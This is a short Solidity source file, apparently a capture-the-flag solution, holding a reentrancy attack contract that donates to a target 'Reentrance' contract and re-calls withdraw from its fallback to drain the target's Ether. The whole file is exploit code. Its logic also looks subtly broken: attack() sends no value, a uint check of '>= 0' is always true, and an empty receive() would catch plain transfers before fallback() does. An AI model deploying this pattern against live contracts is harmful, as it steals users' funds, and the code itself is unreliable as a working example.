interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
  function balanceOf(address _who) external returns (uint balance);
}

contract ReentranceAttack {
  
  Reentrance reentranceContract;

  constructor (address _reentrance) {
    reentranceContract = Reentrance(_reentrance);
  }

  function attack(uint _amount) public {
    reentranceContract.donate(address(this));
    reentranceContract.withdraw(_amount);
  }

  fallback() external payable{
    uint balance = reentranceContract.balanceOf(address(this));
    if (balance >= 0) {
        reentranceContract.withdraw(msg.value);
    }
  }
  receive() external payable{}
}